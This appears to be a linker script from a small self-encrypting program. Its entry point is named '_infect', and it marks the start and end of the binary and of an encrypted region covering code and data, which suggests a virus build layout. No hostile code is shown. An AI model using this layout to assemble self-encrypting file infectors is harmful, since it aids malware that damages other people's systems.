ENTRY(_infect)
	SECTIONS
{
	. = 0x100;
	bin_start = .;
	.text : {
		*(.textstart)
		*(.textearly)
		crypt_start = .;
		*(.text)
	}
	.data : {
		*(.data)
		crypt_end = .;
	}
	bin_end = .;
	.bss : {
		*(.bss)
	}
}
